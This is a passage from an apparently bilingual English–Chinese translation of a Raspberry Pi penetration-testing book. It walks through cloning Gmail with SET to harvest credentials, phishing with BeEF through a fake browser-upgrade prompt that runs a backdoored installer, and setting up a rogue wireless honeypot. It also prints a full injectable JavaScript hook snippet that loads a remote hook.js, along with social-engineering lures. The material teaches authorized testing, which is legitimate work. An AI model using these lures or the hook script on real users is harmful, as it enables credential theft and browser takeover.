    websites, attackers can gather the victims' passwords or possibly inject a command
    shell that gives them full access to the victims' systems. It is a great tool
    for security professionals to demonstrate the chain of trust as a vulnerability,
    meaning demoing how the average person will not pay attention to the location
    where they enter sensitive information as long as the source looks legit.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 社会工程工具包（SET）是由TrustSec的David Kennedy开发的，并预装在Kali Linux中。它经常用于复制受信任的网站，如Google、Facebook和Twitter，目的是吸引受害者对它们发动攻击。当受害者无意中浏览这些复制的网站时，攻击者可以收集受害者的密码，或者可能注入一个命令shell，从而完全访问受害者的系统。这是一个很好的工具，可以让安全专业人员演示信任链作为一个漏洞，意味着演示普通人只要来源看起来合法，就不会注意到他们输入敏感信息的位置。
- en: You can run SET from a Raspberry Pi; however, the victim's experience of the
    Internet speed will be limited to the throughput provided by the Raspberry Pi.
    We found in our testing that victims sometimes experienced long delays before
    being redirected to the real website, which alerted them to a possible attack.
    For this reason, we recommend that you target your SET attacks to a specific user
    rather than a blank audience when using a Raspberry Pi to keep the performance
    good.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以从树莓派上运行SET；然而，受害者的互联网速度体验将受到树莓派提供的吞吐量的限制。我们在测试中发现，受害者有时在被重定向到真实网站之前经历了长时间的延迟，这使他们意识到可能受到攻击。因此，我们建议在使用树莓派时，将SET攻击目标定位到特定用户，而不是空白的受众，以保持性能良好。
- en: In the following example, we will set up a Raspberry Pi to clone Gmail. As shown
    in the following image, the goal is to make a victim believe that they are accessing
    their Gmail account and redirect them to the real Gmail website after they log
    in but store their login credentials. The trick will be to get the victim to access
    the SET server; however, that's where your social engineering abilities come into
    play. For example, you could e-mail a link, post the link on a social media source,
    or poison the DNS to direct traffic to your attack server. The attacker can remotely
    access the Raspberry Pi to pull down stolen credentials for a final penetration
    testing report.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下示例中，我们将设置一个树莓派来克隆Gmail。如下图所示，目标是让受害者相信他们正在访问他们的Gmail账户，并在他们登录后将他们重定向到真正的Gmail网站，但存储他们的登录凭据。诀窍在于让受害者访问SET服务器；然而，这就是你的社会工程能力发挥作用的地方。例如，你可以通过电子邮件发送链接，将链接发布在社交媒体来源上，或者毒害DNS以将流量引导到你的攻击服务器。攻击者可以远程访问树莓派，以获取被盗的凭据，用于最终的渗透测试报告。
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_10.jpg)'
  id: totrans-83
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_10.jpg)'
- en: Let's take a look at how to use SET on a Raspberry Pi.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看如何在树莓派上使用SET。
- en: 'To launch SET, type `setoolkit` in a command prompt window. You will be prompted
    to enable **bleeding-edge repos**. Bleeding-edge repos are a new feature in Kali
    that includes daily builds on popular tools such as SET. The best practice is
    to enable the bleeding-edge repos and test your exercise prior to using it in
    a live penetration test as things can slightly change. The following screenshot
    shows how to enable **bleeding-edge repos**:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动SET，在命令提示符窗口中键入`setoolkit`。您将被提示启用**最新功能仓库**。最新功能仓库是Kali中的一个新功能，其中包括流行工具的每日构建，如SET。最佳做法是在使用实时渗透测试之前启用最新功能仓库并测试您的练习，因为事情可能会略有变化。以下截图显示了如何启用**最新功能仓库**：
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_11.jpg)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_11.jpg)'
- en: Tip
  id: totrans-87
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Bleeding-edge repos are a great way to get the latest software packages on popular
    tools. However, seasoned security professionals will find that these tools often
    change and the features can no longer be used. The best practice is to disable
    updates prior to going live with a tool unless you have time to test updates from
    new releases.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 最新功能仓库是获取流行工具的最新软件包的好方法。然而，经验丰富的安全专业人员会发现这些工具经常发生变化，某些功能可能无法再使用。最佳做法是在实时使用工具之前禁用更新，除非您有时间测试新版本的更新。
- en: 'Once SET is launched, you will need to agree to the license and terms of the
    software program by typing **yes**. At this point, you will see the main menu
    of SET, as shown in the following screenshot:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 启动SET后，您需要输入**yes**同意软件许可和条款。此时，您将看到SET的主菜单，如下截图所示：
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_12.jpg)'
  id: totrans-90
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_12.jpg)'
- en: SET is a menu-based attack tool. Unlike other tools, it does not use the command
    line. This is based around the concept that social engineering attacks are polymorphic
    in nature and require multiple linear steps to set up. A command-line tool can
    cause confusion when developing these types of attacks.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: SET是一个基于菜单的攻击工具。与其他工具不同，它不使用命令行。这是基于社会工程攻击是多态的性质，并且需要多个线性步骤来设置的概念。命令行工具在开发这些类型的攻击时可能会引起混乱。
- en: For this example, we will select **1) Social - Engineering Attacks**.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在此示例中，我们将选择**1) 社会工程攻击**。
- en: 'The following screenshot shows the menu under **Social – Engineering Attacks**:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示了**社会工程攻击**菜单下的菜单：
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_13.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_13.jpg)'
- en: 'Next, we will select **2) Website Attack Vectors**. This will bring up a variety
    of different options. In this test scenario, we will perform a simple credential
    harvester attack, which is **3) Credential Harvester Attack Method,** as shown
    in the following screenshot:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将选择**2) 网站攻击向量**。这将带来各种不同的选项。在这个测试场景中，我们将执行一个简单的凭证窃取攻击，即**3) 凭证窃取攻击方法**，如下截图所示：
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_14.jpg)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_14.jpg)'
- en: When you select the **Credential Harvester Attack Method** option, you have
    the option of using a pre-existing template or cloning a website. We found that
    most templates don't work that well against the average person, so it is best
    to clone a real website. In addition, websites often change, so cloning a website
    will give you the latest version that your victim will expect to see.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 当您选择**凭证窃取攻击方法**选项时，您可以选择使用预先存在的模板或克隆网站。我们发现大多数模板对普通人来说效果不佳，因此最好克隆一个真实的网站。此外，网站经常发生变化，因此克隆网站将为您提供受害者预期看到的最新版本。
- en: When you select the appropriate option, you will be prompted to enter the IP
    address of the interface that SET should listen on. If you have multiple interfaces,
    you should enter the IP address of your Internet-facing interface or the victims
    might have problems accessing your Raspberry Pi attack server.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 当您选择适当的选项时，您将被提示输入SET应监听的接口的IP地址。如果您有多个接口，您应该输入面向互联网的接口的IP地址，否则受害者可能无法访问您的树莓派攻击服务器。
- en: If you selected **2) Site Cloner** under **Credential Harvester Attack Method**,
    you will need to enter the full URL of the site that you want to clone such as
    [https://www.facebook.com](https://www.facebook.com). If you select a website
    template, you will be choosing an existing template from a provided list. The
    following screenshot shows an example of some available templates. Note that these
    templates are very basic and dated, meaning they will probably not look like the
    real thing. This is why you should clone a site when performing a real penetration
    test.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您在“凭证窃取攻击方法”下选择了**2) 网站克隆器**，您将需要输入要克隆的网站的完整URL，例如[https://www.facebook.com](https://www.facebook.com)。如果您选择网站模板，您将从提供的列表中选择一个现有模板。以下截图显示了一些可用模板的示例。请注意，这些模板非常基本且过时，这意味着它们可能看起来不像真实的东西。这就是为什么在进行真正的渗透测试时，您应该克隆一个网站。
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_15.jpg)'
  id: totrans-100
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_15.jpg)'
- en: The menu in the following screenshot offers several types of attacks. We recommend
    that you test each of these and make a selection based on your personal preference
    and success rate. Some of these attacks require a man-in-the-middle setup, which
    was discussed in the *Man-in-the-middle attacks* section of [Chapter 3](ch03.html
    "Chapter 3. Penetration Testing"), *Penetration Testing*.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图中的菜单提供了几种类型的攻击。我们建议您测试每种攻击，并根据个人偏好和成功率进行选择。其中一些攻击需要进行中间人设置，这在[第3章](ch03.html
    "第3章 渗透测试")*渗透测试*的*中间人攻击*部分中已经讨论过。
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_16.jpg)'
  id: totrans-102
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程工具包](img/Insert6435OT_04_16.jpg)'
- en: 'For our example, we will select **3) Credential Harvester Attack Method**.
    This attack hosts a fake website and waits for victims to log in. When a victim
    sees the login and enters their login credentials, they will be redirected to
    the real website while unknowingly having their credentials captured for the attacker
    to use at a later time. The following example shows what the cloned Google login
    screen looks like:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的示例中，我们将选择**3)凭据窃取攻击方法**。这种攻击会托管一个假网站，等待受害者登录。当受害者看到登录页面并输入他们的登录凭据时，他们将被重定向到真实网站，同时不知不觉地让攻击者捕获他们的凭据，以便以后使用。以下示例展示了克隆的谷歌登录界面的样子：
- en: '![The Social-Engineer Toolkit](img/Insert6435OT_04_17.jpg)'
  id: totrans-104
  prefs: []
  type: TYPE_IMG
  zh: '![社会工程师工具包](img/Insert6435OT_04_17.jpg)'
- en: The difficult part of this attack is tricking the victim into believing that
    they are going to the real web page. This can be accomplished by sending them
    an e-mail with a fake link, posting a link on a social media website, performing
    DNS poisoning, and so on. SET has a number of tools and utilities to make this
    easier, but these are out of scope for a Raspberry Pi book. Check out SET's website
    found at [https://www.trustedsec.com/social-engineer-toolkit/](https://www.trustedsec.com/social-engineer-toolkit/)
    for more information on these tools.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 这种攻击的困难之处在于让受害者相信他们正在访问真实的网页。这可以通过发送一封带有假链接的电子邮件，在社交媒体网站上发布链接，执行DNS投毒等方式来实现。SET有许多工具和实用程序可以使这一切变得更容易，但这些超出了树莓派书籍的范围。请访问SET的网站[https://www.trustedsec.com/social-engineer-toolkit/](https://www.trustedsec.com/social-engineer-toolkit/)，了解更多关于这些工具的信息。
- en: Tip
  id: totrans-106
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The best practice is to launch SET attacks from a remote server rather than
    the Raspberry Pi due to the process requirements to execute these types of attacks.
    From a user viewpoint, the attack will look the same if it is locally hosted on
    a Raspberry Pi or from an external system since our example is cloning a cloud
    service.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 最佳实践是从远程服务器而不是树莓派上启动SET攻击，因为执行这些类型的攻击需要的进程要求。从用户的角度来看，如果攻击是在树莓派上本地托管的，或者是从外部系统上托管的，攻击看起来是一样的，因为我们的示例是克隆一个云服务。
- en: Phishing with BeEF
  id: totrans-108
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用BeEF进行网络钓鱼
- en: The **Browser Exploitation Framework** (**BeEF**) is another tool that is often
    categorized under exploit penetration testing, honeypot, and social engineering.
    BeEF is used to host a malicious web server such as SET. However, BeEF leverages
    weaknesses found in Internet browsers for its attack. When a victim connects to
    a BeEF server, BeEF will hook the system and examine how exploitable the victim's
    web browser is to various attacks. Based on these findings, BeEF will offer a
    range of command modules that can be launched, such as taking screenshots or triggering
    a beep sound. Hooked systems can only be accessed while they are online. However,
    once hooked, BeEF can track when a system establishes Internet connectivity to
    continue launching commands against that system. You can find more on BeEF at
    [http://beefproject.com/](http://beefproject.com/).
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: '**浏览器利用框架**（**BeEF**）是另一个经常被归类为利用渗透测试、蜜罐和社会工程的工具。BeEF用于托管一个恶意的Web服务器，就像SET一样。然而，BeEF利用了互联网浏览器中发现的弱点进行攻击。当受害者连接到BeEF服务器时，BeEF将钩住系统，并检查受害者的网络浏览器对各种攻击的易受性。根据这些发现，BeEF将提供一系列可以启动的命令模块，比如截屏或触发蜂鸣声。被钩住的系统只能在在线时访问。然而，一旦被钩住，BeEF可以跟踪系统何时建立互联网连接，以继续对该系统发动攻击。您可以在[http://beefproject.com/](http://beefproject.com/)找到更多关于BeEF的信息。'
- en: Tip
  id: totrans-110
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The authors have used BeEF for authorized penetration testing since it doesn't
    require modifying the endpoint systems to be successful. This means that there
    is less risk of upsetting clients and less cleanup after the penetration test.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 作者们使用BeEF进行授权渗透测试，因为它不需要修改终端系统就能成功。这意味着在渗透测试后，客户的风险较小，清理工作也较少。
- en: For this use case, we will perform an attack similar to the one we did with
    SET; however, this attack will target a victim's browser rather than tricking
    them to log into a website. This means we will once again need to clone a known
    website or develop a template that will be believable so that victims don't realize
    that they are being attacked. The biggest benefit of using BeEF is that we just
    need a victim to access the website one time to get them hooked. Once hooked,
    we can attack them even if they leave the website or go offline and come back
    online at another time.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这种用例，我们将执行一个类似于我们在SET中进行的攻击；然而，这次攻击将针对受害者的浏览器而不是欺骗他们登录网站。这意味着我们将再次需要克隆一个已知的网站或开发一个模板，使受害者不意识到他们正在受到攻击。使用BeEF的最大好处是我们只需要让受害者访问网站一次就能钩住他们。一旦被钩住，即使他们离开网站或者下线再次上线，我们也可以攻击他们。
- en: We found that using simple social engineering tactics such as developing a fake
    holiday e-card and posting it on social media sources, or sending a link to the
    attack server through e-mail, were very effective methods to get a victim to access
    our BeEF server. A very basic, yet believable, holiday card is easy to put together
    by just gathering a few images and stating the occasion in bold font.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们发现使用简单的社会工程学策略，比如制作一个假的节日电子卡片并在社交媒体上发布，或者通过电子邮件发送攻击服务器的链接，是让受害者访问我们的BeEF服务器的非常有效的方法。一个非常基本但可信的节日卡片很容易通过收集一些图片并用粗体字陈述场合来制作。
- en: The following diagram represents running a BeEF server from a Raspberry Pi on
    the internal network with the goal of hooking local systems. To get users to access
    the BeEF server, the example shows an attacker sending an e-mail that includes
    a link to a **Fake Holiday Card** hosted on a BeEF hook server. Once the victim
    clicks on the link, they will see the holiday card and be hooked by BeEF. The
    attacker can remotely execute command modules from the Raspberry Pi while the
    hooked victim continues to use the Internet.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图表表示在内部网络上从树莓派上运行BeEF服务器，并且目标是钩住本地系统。为了让用户访问BeEF服务器，示例展示了攻击者发送一封电子邮件，其中包含一个托管在BeEF
    hook服务器上的**假节日卡片**的链接。一旦受害者点击链接，他们将看到节日卡片，并被BeEF钩住。攻击者可以在受害者继续使用互联网的同时，从树莓派上远程执行命令模块。
- en: '![Phishing with BeEF](img/Insert6435OT_04_18.jpg)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_18.jpg)'
- en: Let's walk through building this attack scenario.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们一起构建这种攻击场景。
- en: 'To start BeEF, navigate to the BeEF directory using `cd /usr/share/beef-xss`
    and then run the `beef` script as shown in the following screenshot:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动BeEF，使用`cd /usr/share/beef-xss`导航到BeEF目录，然后像以下截图中所示运行`beef`脚本：
- en: '![Phishing with BeEF](img/Insert6435OT_04_19.jpg)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_19.jpg)'
- en: 'Once the BeEF script is running, you can access the web-based BeEF control
    panel by opening a web browser and pointing it to `http://ip_address_of_raspberry_pi_kali:3000/ui/panel`.
    The following screenshot shows the main login page of BeEF:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦BeEF脚本运行，您可以通过打开Web浏览器并将其指向`http://ip_address_of_raspberry_pi_kali:3000/ui/panel`来访问基于Web的BeEF控制面板。以下截图显示了BeEF的主要登录页面：
- en: '![Phishing with BeEF](img/Insert6435OT_04_20.jpg)'
  id: totrans-120
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_20.jpg)'
- en: You can log in by using the **Username** `beef` and the **Password** `beef`.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以使用**用户名**`beef`和**密码**`beef`登录。
- en: Like other social engineering attacks, you will need to trick your victim into
    going to a hook page. BeEF comes with some basic demo hook pages; however, like
    SET, these pages are pretty basic and probably won't fool the average user. You
    can test BeEF by going to `http://ip_address_of_raspberry_pi_kali:3000/demos/butcher/index.html`
    to see a basic hook page.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 与其他社会工程攻击一样，您需要欺骗受害者前往一个钓鱼页面。BeEF带有一些基本的演示钓鱼页面；但是，就像SET一样，这些页面相当基本，可能无法愚弄普通用户。您可以通过访问`http://ip_address_of_raspberry_pi_kali:3000/demos/butcher/index.html`来测试BeEF，以查看一个基本的钓鱼页面。
- en: Tip
  id: totrans-123
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: In the real world, you will need to edit the demo page to make it look like
    something believable. Your users do not need to stay on the page to be hooked;
    however, if it looks suspicious, they may report it. You can also add a JavaScript
    template with a tab hijacking technique to it.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 在现实世界中，您需要编辑演示页面，使其看起来像是可信的东西。您的用户不需要停留在页面上就会被吸引；但是，如果看起来可疑，他们可能会报告它。您还可以添加一个带有选项卡劫持技术的JavaScript模板。
- en: Once a system is hooked, the attacker will see the victim's browser in the control
    panel and they can send a variety of different commands. In some cases, you might
    be able to send the user a more complex and valuable exploit. In other cases,
    you might be able to just retrieve basic information from the client. The available
    commands depend upon the type of web browser used by the victim as well as how
    up to date that web browser is with security patches.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦系统被钓鱼，攻击者将在控制面板中看到受害者的浏览器，并且可以发送各种不同的命令。在某些情况下，您可能能够发送给用户一个更复杂和有价值的利用。在其他情况下，您可能只能从客户端检索基本信息。可用的命令取决于受害者使用的Web浏览器类型以及该Web浏览器的安全补丁更新情况。
- en: 'The following screenshot shows one Linux-based system that has been hooked:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示了一个已被钓鱼的基于Linux的系统：
- en: '![Phishing with BeEF](img/Insert6435OT_04_21.jpg)'
  id: totrans-127
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_21.jpg)'
- en: The module tree shows possible exploits that are available to run against the
    hooked victim.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 模块树显示了可用于钓鱼受害者的可能利用。
- en: Tip
  id: totrans-129
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: BeEF includes a risk level for each command that defines the likelihood of the
    command working as well as the risk of alarming the victim of malicious behavior.
    It is highly recommended that you test the exploits in a lab environment against
    a system similar to a hooked target prior to using them during a live penetration
    test. We found during our testing that many exploits don't work as advertised
    on live systems.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: BeEF为每个命令包括了一个风险级别，定义了命令成功运行的可能性以及引起受害者对恶意行为的警觉风险。强烈建议您在进行实时渗透测试之前，在实验室环境中针对类似于被钓鱼目标的系统测试这些利用。在我们的测试中，我们发现许多利用在实际系统上的效果并不如宣传的那样好。
- en: An example of levering commands on an exploitable browser is to send out a JavaScript
    template to trick a user into clicking on something. So, for the following example,
    we will send the old school Clippy pop up asking the user to upgrade their browser.
    We will include a link that has a matching browser installation file that has
    been wrapped with a backdoor application. The topic of creating payloads, encoding
    them to bypass security defenses, and wrapping payloads with trusted executable
    files was covered earlier in this chapter under the *Metasploit* section.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 在可利用的浏览器上执行命令的一个例子是发送一个JavaScript模板来欺骗用户点击某物。因此，对于以下示例，我们将发送老式的Clippy弹出窗口，要求用户升级其浏览器。我们将包含一个链接，该链接具有一个已经包含了后门应用程序的匹配浏览器安装文件。在本章的*Metasploit*部分中，已经介绍了创建有效载荷、对其进行编码以绕过安全防御以及将有效载荷与可信可执行文件包装在一起的主题。
- en: '![Phishing with BeEF](img/Insert6435OT_04_22.jpg)'
  id: totrans-132
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_22.jpg)'
- en: 'The first step to launch this attack is to go to the **Commands** tab in the
    BeEF admin console:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 发动这种攻击的第一步是转到BeEF管理控制台中的**Commands**选项卡：
- en: '![Phishing with BeEF](img/Insert6435OT_04_23.jpg)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_23.jpg)'
- en: 'From there, click on the **Social Engineering** folder and find the **Clippy**
    attack:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，点击**Social Engineering**文件夹，找到**Clippy**攻击：
- en: '![Phishing with BeEF](img/Insert6435OT_04_24.jpg)'
  id: totrans-136
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_24.jpg)'
- en: You will notice that the default settings for the **Clippy** attack are built-in.
    Basically, it will download a JavaScript template that includes an image file
    of **Clippy** hosted on an internal site. It will also download and run an EXE
    file. In the following example, it downloads and runs `putty.exe`. Note that executable
    code link shown in the following screenshot is longer than the display window.
    This can be anything you desire for your attack.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 您会注意到**Clippy**攻击的默认设置是内置的。基本上，它将下载一个包含在内部网站上托管的**Clippy**图像文件的JavaScript模板。它还将下载并运行一个EXE文件。在以下示例中，它下载并运行了`putty.exe`。请注意，以下截图中显示的可执行代码链接比显示窗口更长。这可以是您攻击所需的任何内容。
- en: '![Phishing with BeEF](img/Insert6435OT_04_25.jpg)'
  id: totrans-138
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_25.jpg)'
- en: You can have **Clippy** display a message before and after the download. The
    default settings display the message **Your browser appears to be out of date.
    Would you like to upgrade it?** before the download and displays **Thanks for
    upgrading your browser! Look forward to a safer, faster web!** after the download.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以让**Clippy**在下载之前和之后显示一条消息。默认设置在下载之前显示消息**您的浏览器似乎已过时。您想升级吗？**，并在下载后显示**感谢升级您的浏览器！期待更安全、更快速的网络！**。
- en: 'This attack is browser-based. So, unlike the original **Clippy** that appeared
    in earlier versions of Microsoft Word, this attack works regardless of the operating
    system. It works on any browser that supports JavaScript. In the following screenshot,
    we show the attack on a Mac OS X computer that doesn''t have the proper version
    of Microsoft Office:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 这种攻击是基于浏览器的。因此，与出现在早期版本的Microsoft Word中的原始**Clippy**不同，这种攻击不受操作系统的影响。它适用于支持JavaScript的任何浏览器。在下面的截图中，我们展示了在一个没有正确版本的Microsoft
    Office的Mac OS X计算机上的攻击：
- en: '![Phishing with BeEF](img/Insert6435OT_04_26.jpg)'
  id: totrans-141
  prefs: []
  type: TYPE_IMG
  zh: '![使用BeEF进行网络钓鱼](img/Insert6435OT_04_26.jpg)'
- en: 'We are often asked how one can "hook" a victim browser without the obvious
    demo pages that ship with BeEF. The following JavaScript command can be used on
    any web page to hook a browser:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 人们经常问我们如何在没有BeEF附带的明显演示页面的情况下“钩住”受害者浏览器。以下JavaScript命令可用于任何网页来钩住浏览器：
- en: '`%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f192.168.135.129:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();`'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: '`%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f192.168.135.129:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();`'
- en: You will still need to be creative in how you want to run the JavaScript command.
    It can run automatically, embedded in an ad, or any other creative way. Simply
    replace the IP address variable in the JavaScript command with your BeEF server.
    You must have noticed that the IP address of our server was `192.168.135.129`
    in the previous example. You will need to replace this with the IP address of
    your BeEF server. Ensure that your BeEF server is reachable by the victim machine
    or this attack won't work.
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 您仍然需要创造性地运行JavaScript命令。它可以自动运行，嵌入广告，或者其他创造性的方式。只需用您的BeEF服务器替换JavaScript命令中的IP地址变量。您一定已经注意到我们服务器的IP地址在前面的例子中是`192.168.135.129`。您需要用您的BeEF服务器的IP地址替换它。确保您的BeEF服务器可以被受害者机器访问，否则这种攻击将无法进行。
- en: Rogue access honeypots
  id: totrans-145
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 流氓接入蜜罐
- en: A honeypot in computer terminology is a trap designed to detect, deflect, or
    mislead the attempts to compromise a computer system or network. The typical honeypot
    is a computer, piece of data, or network segment that appears to be part of the
    real network, no matter how isolated and/or monitored the network is. Most honeypots
    present themselves as being vulnerable and containing something of value to lure
    attacks away from the real target.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 在计算机术语中，蜜罐是一种旨在检测、转移或误导对计算机系统或网络进行破坏的企图的陷阱。典型的蜜罐是一台计算机、一段数据或网络段，看起来是真实网络的一部分，无论网络有多么孤立和/或受监控。大多数蜜罐都表现出自己是脆弱的，并包含一些有价值的东西，以诱使攻击者远离真正的目标。
- en: There are typically two types of honeypots. The more commonly used one is a
    production honeypot that is designed to be part of a network defense strategy.
    A production honeypot typically means placing honeypots inside the network with
    the goal of luring hackers that have breached other defenses, which means that
    production honeypots are the last effort to prevent sensitive systems from being
    compromised.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 通常有两种类型的蜜罐。更常用的是生产蜜罐，它是设计成网络防御策略的一部分。生产蜜罐通常意味着将蜜罐放置在网络内部，目的是引诱已经突破其他防御措施的黑客，这意味着生产蜜罐是防止敏感系统被破坏的最后一道防线。
- en: The other type of honeypot is a monitoring honeypot, which is typically placed
    on a network to research data that passes through it. This is similar to a man-in-the-middle
    attack, however usually the honeypot presents itself as an authorized source that
    victims connect to. An example is developing a fake access point that victims
    believe is a viable source to connect to the network. As a victim uses the honeypot,
    the attacker monitors the traffic including capturing the login credentials. We
    call this attack a rogue access honeypot based on using a monitor honeypot technique
    mixed with provisioning an access method to the honeypot through a fake wireless
    access point. There are other types of honeypots such as high interaction and
    low interaction honeypots, honeyclients, and so on. However, most of these are
    not suitable for the Raspberry Pi form-factor.
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种蜜罐的类型是监控蜜罐，通常放置在网络上以研究通过它的数据。这类似于中间人攻击，但通常蜜罐会呈现自己为受害者连接的授权来源。一个例子是开发一个虚假的接入点，受害者相信这是一个可连接到网络的可行来源。当受害者使用蜜罐时，攻击者监视流量，包括捕获登录凭据。我们称这种攻击为基于使用监视蜜罐技术并通过虚假无线接入点向蜜罐提供接入方法的流氓接入蜜罐攻击。还有其他类型的蜜罐，如高交互和低交互蜜罐，蜜客户端等。但是，大多数这些都不适合树莓派的形态。
- en: A rogue access honeypot, as we defined it, is the most appropriate use for a
    Raspberry Pi-based honeypot since our focus is to capture data rather than to
    crack network defense as well as hide such an attack by taking advantage of the
    Raspberry Pi's mobile form-factor.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 流氓接入蜜罐，正如我们定义的那样，是树莓派蜜罐的最合适用途，因为我们的重点是捕获数据，而不是破解网络防御，同时利用树莓派的移动形态来隐藏这种攻击。
- en: 'In the following example, we will create a rogue access honeypot that will
    act as a rogue wireless access point with the goal to capture sensitive information
    while victims connect to it to access the Internet. We will connect the `eth0`
    port into an Internet-facing port and leverage a USB to wireless adapter to host
    the rogue wireless service. The attack can be modified using wireless for both
    the Internet and the rogue wireless interfaces; however, we will need two USB
    to wireless adapters to accomplish this. The attacker can access the Raspberry
    Pi honeypot from anywhere as long as a VPN connection is set up prior to launching
    the attack. The following diagram shows what we will build:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
